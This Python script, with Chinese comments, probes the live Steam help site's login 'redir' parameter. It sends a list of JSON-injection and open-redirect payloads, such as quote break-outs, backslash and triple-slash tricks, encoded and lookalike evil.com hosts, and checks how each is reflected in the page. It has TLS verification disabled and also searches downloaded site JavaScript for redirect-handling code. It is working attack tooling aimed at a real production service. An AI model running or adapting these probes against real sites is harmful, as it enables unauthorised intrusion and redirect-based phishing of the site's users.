# -*- coding: utf-8 -*-
"""help2 第四批:Login redir JSON 注入 + redirectUrl 消费逻辑分析"""
import re
import sys
import ssl
import http.cookiejar
import urllib.parse
import urllib.request

sys.stdout.reconfigure(encoding='utf-8', errors='replace')

CTX = ssl.create_default_context()
CTX.check_hostname = False
CTX.verify_mode = ssl.CERT_NONE
UA = ("Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 "
      "(KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36")
BASE = "https://help.steampowered.com"


def make_opener():
    cj = http.cookiejar.CookieJar()
    op = urllib.request.build_opener(
        urllib.request.HTTPSHandler(context=CTX),
        urllib.request.HTTPCookieProcessor(cj))
    op.addheaders = [('User-Agent', UA)]
    op.open(BASE + "/en/", timeout=15).read()
    sid = [c.value for c in cj if c.name == 'sessionid'][0]
    return op, sid


def req(op, url, method="GET", data=None, extra_headers=None):
    headers = {'User-Agent': UA}
    if extra_headers:
        headers.update(extra_headers)
    r = urllib.request.Request(url, headers=headers, method=method, data=data)
    try:
        resp = op.open(r, timeout=20)
        return resp.status, resp.read().decode('utf-8', 'replace'), dict(resp.headers)
    except urllib.error.HTTPError as e:
        return e.code, e.read().decode('utf-8', 'replace'), dict(e.headers)


def main():
    op, sid = make_opener()
    ck = f'sessionid={sid}'

    print("=" * 70)
    print("[E] Login redir JSON 注入测试")
    print("=" * 70)
    payloads = [
        'X"',
        'X"]},"evil":1',
        'X\\',
        'X\\u0022',
        'X/../',
        '\\evil.com',          # 反斜杠 → 浏览器规范化?
        '///evil.com',
        '%5cevil.com',
        'https://help.steampowered.com.evil.com/x',
        'https://evil.com',    # 对照:403
    ]
    for rd in payloads:
        s, b, h = req(op, BASE + "/en/wizard/Login?redir=" + urllib.parse.quote(rd, safe=''),
                      extra_headers={'Cookie': ck})
        m = re.search(r'data-props="([^"]*)"', b)
        dp = m.group(1) if m else "(none)"
        print(f"redir={rd!r:42s} -> {s} data-props={dp[:150]}")
        # 原始反射
        raw = b.count(rd)
        print(f"   原始反射: {raw} | 编码反射: {b.count(urllib.parse.quote(rd, safe=''))}")

    print()
    print("=" * 70)
    print("[F] redirectUrl 消费逻辑 (help.js)")
    print("=" * 70)
    js = open(r'D:\scan\_valve_help\js\help.js', encoding='utf-8', errors='replace').read()
    for kw in ['redirectUrl', 'strRedirectURL', 'CLoginPromptManager', 'location.href', 'location.replace',
               'window.location']:
        for m in re.finditer(re.escape(kw), js):
            i = m.start()
            ctx = js[max(0, i - 120):i + 200].replace('\n', ' ')
            print(f"--- [{kw}] @{i} ---")
            print(f"    {ctx[:320]}")
            print()

    print()
    print("=" * 70)
    print("[G] shared_global.js 中 LoginManager 逻辑")
    print("=" * 70)
    sg = open(r'D:\scan\_valve_help\js\shared_global.js', encoding='utf-8', errors='replace').read()
    for kw in ['redirectUrl', 'strRedirectURL', 'CLoginPromptManager']:
        for m in list(re.finditer(re.escape(kw), sg))[:6]:
            i = m.start()
            ctx = sg[max(0, i - 150):i + 250].replace('\n', ' ')
            print(f"--- [{kw}] @{i} ---")
            print(f"    {ctx[:400]}")
            print()


if __name__ == '__main__':
    main()
